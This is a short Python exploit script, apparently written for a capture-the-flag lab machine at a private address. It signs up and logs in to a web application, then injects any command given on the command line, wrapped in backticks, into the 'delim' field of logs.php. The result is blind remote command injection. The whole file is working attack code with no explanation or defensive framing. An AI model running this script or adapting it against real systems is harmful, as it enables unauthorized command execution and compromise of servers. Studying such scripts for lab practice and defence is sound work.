import sys
import requests as r

url = 'http://10.10.11.104'

try:
    def signup():
        location = f'{url}/accounts.php'
        data = {'username': 'poorduck', 'password': 'p00rduck', 'confirm': 'p00rduck'}
        create_ac = r.post(location, data=data, allow_redirects=False)
        if 'Success! User was added!' in create_ac.text:
            return '[+] Account is created'
        elif 'Username is already taken!' in create_ac.text:
            return '[+] User already exits'
        else:
            return create_ac.text


    print(signup())
    s = r.session()
    data = {'username': 'poorduck', 'password': 'p00rduck'}
    s.post(f'{url}/login.php', data=data)


    def exec_cmd(cmd):
        location = f'{url}/logs.php'
        data = {'delim': f'`{cmd}`'}
        execute = s.post(location, data=data, timeout=10)
        if 'time,user,fileID' in execute.text:
            return '[+] Command Executed. This is a blind command injection!'
        else:
            return execute.text


    print(exec_cmd(sys.argv[1]))
    s.close()
except r.exceptions.Timeout:
    print('\n[-] Response timeout!')
except KeyboardInterrupt:
    print('\n[-] Exiting execuation!')
